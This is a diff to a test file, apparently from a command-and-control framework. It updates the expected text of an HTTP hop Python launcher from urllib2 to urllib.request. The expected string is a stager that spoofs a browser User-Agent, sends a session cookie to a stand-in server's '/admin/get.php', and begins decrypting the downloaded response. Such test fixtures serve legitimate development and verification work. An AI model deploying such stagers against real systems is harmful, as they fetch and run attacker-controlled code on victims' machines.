@@ -459,12 +459,15 @@ def _expected_http_foreign_python_launcher():
 def _expected_http_hop_python_launcher():
     return dedent(
         """
-        import sys;o=__import__({2:'urllib2',3:'urllib.request'}[sys.version_info[0]],fromlist=['build_opener']).build_opener();UA='Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko';server='http://localhost';t='/admin/get.php';import urllib2
-        proxy = urllib2.ProxyHandler();
-        o = urllib2.build_opener(proxy);
+        import sys;
+        import urllib.request;
+        UA='Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko';server='http://localhost';t='/admin/get.php';hop='fake_listener';
+        req=urllib.request.Request(server+t);
+        proxy = urllib.request.ProxyHandler();
+        o = urllib.request.build_opener(proxy);
         o.addheaders=[('User-Agent',UA), ("Cookie", "session=cm91dGluZyBwYWNrZXQ=")];
-        urllib2.install_opener(o);
-        a=o.open(server+t).read();
+        urllib.request.install_opener(o);
+        a=urllib.request.urlopen(req).read();
         IV=a[0:4];
         data=a[4:];
         key=IV+''.encode('UTF-8');
